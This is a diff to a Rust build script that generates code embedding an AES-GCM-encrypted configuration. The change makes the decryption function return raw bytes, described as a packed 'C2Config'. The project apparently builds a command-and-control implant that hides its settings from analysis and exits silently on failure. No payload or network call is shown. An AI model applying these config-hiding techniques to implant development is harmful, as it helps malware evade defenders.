@@ -183,21 +183,19 @@ fn main() {
         conf_code.push_str(&format!("const CONFIG_KEY: [u8; 32] = {:?};\n", key_bytes));
         conf_code.push_str(&format!("const CONFIG_NONCE: [u8; 12] = {:?};\n", nonce_bytes));
         conf_code.push_str(&format!("const CONFIG_CIPHER: [u8; {}] = {:?};\n", cipher_bytes.len(), cipher_bytes));
-        conf_code.push_str("pub fn get_config() -> String {\n");
+        // get_config() returns the raw decrypted bytes: the plaintext is a
+        // packed binary C2Config (see common.rs), not UTF-8 JSON.
+        conf_code.push_str("pub fn get_config() -> Vec<u8> {\n");
         conf_code.push_str("    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&CONFIG_KEY);\n");
         conf_code.push_str("    let cipher = Aes256Gcm::new(key);\n");
         conf_code.push_str("    let nonce = aes_gcm::Nonce::from_slice(&CONFIG_NONCE);\n");
-        conf_code.push_str("    let plaintext = match cipher.decrypt(nonce, CONFIG_CIPHER.as_ref()) {\n");
+        conf_code.push_str("    match cipher.decrypt(nonce, CONFIG_CIPHER.as_ref()) {\n");
         conf_code.push_str("        Ok(p) => p,\n");
-        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
-        conf_code.push_str("    };\n");
-        conf_code.push_str("    match String::from_utf8(plaintext) {\n");
-        conf_code.push_str("        Ok(s) => s,\n");
         conf_code.push_str("        Err(_) => std::process::exit(1),\n");
         conf_code.push_str("    }\n");
         conf_code.push_str("}\n");
     } else {
-        conf_code.push_str("pub fn get_config() -> String { String::new() }\n");
+        conf_code.push_str("pub fn get_config() -> Vec<u8> { Vec::new() }\n");
     }
     fs::write(&config_dest_path, conf_code).expect("Failed to write config artifact");
 
